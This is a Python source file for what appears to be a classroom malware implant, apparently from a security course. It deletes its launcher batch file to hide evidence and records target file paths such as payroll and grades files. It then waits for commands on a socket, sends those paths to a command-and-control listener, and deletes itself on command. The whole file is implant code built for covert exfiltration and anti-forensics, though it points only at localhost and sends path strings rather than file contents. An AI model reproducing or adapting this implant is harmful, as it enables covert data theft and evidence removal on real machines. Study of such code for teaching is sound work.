import os
from os import remove
from sys import argv
import requests
import socket
import sys

print("Implant Running")

#Remove evidence of script.bat from the start
try:
    os.remove("script.bat")
except:
    print("Batch file already gone")

#Add the paths to paths.txt
with open('Paths.txt', 'w') as f:
    f.write('C:\\Users\\CS590J\\Desktop\\Teacher Files\\Payroll.txt\n')
    f.write('C:\\Users\\CS590J\\Desktop\\Student Files\\Grades.txt\n')
    f.close()

#function returns the command recieved by the victim implant listener
def recieve_command():
    connection, client_address = implant_socket.accept()
    try:
        #Recieves and prints the data
        while True:
            data = connection.recv(100)
            if data:
                return(data)
            
    finally:
        # Clean up the connection
        print("Connection Closed")
        connection.close()

#function sends data passed to it to the c2
def send_exfil(data):
    try:
        # Send data
        print('sending:', data)
        c2_socket.sendall(data)
    
    except:
        print("Error")



# Create a TCP/IP socket for the victim implant
implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind the socket to the port and listen
implant_server_address = ('localhost', 10000)
implant_socket.bind(implant_server_address)
implant_socket.listen(1)

while(True):
    comm = recieve_command().decode("utf-8")
    print("Recieved Command: ", comm)

    if(comm == "2"):
        file1 = open('Paths.txt', 'r')
        Lines = file1.readlines()
        file1.close()

        # Create a TCP/IP socket
        c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect the socket to the port where the server is listening
        c2_server_address = ('localhost', 9999)
        print("Connecting to Socket")
        c2_socket.connect(c2_server_address)

        for line in Lines:
            #exfil the file for each location in Lines
            send_exfil(str.encode(line))

        #attempt to close socket
        try:
            print("Closing Socket")
            c2_socket.close()
        
        #in case of error
        except:
            print("error")

    if(comm == "1"):
        remove(argv[0])
        sys.exit(0)
        
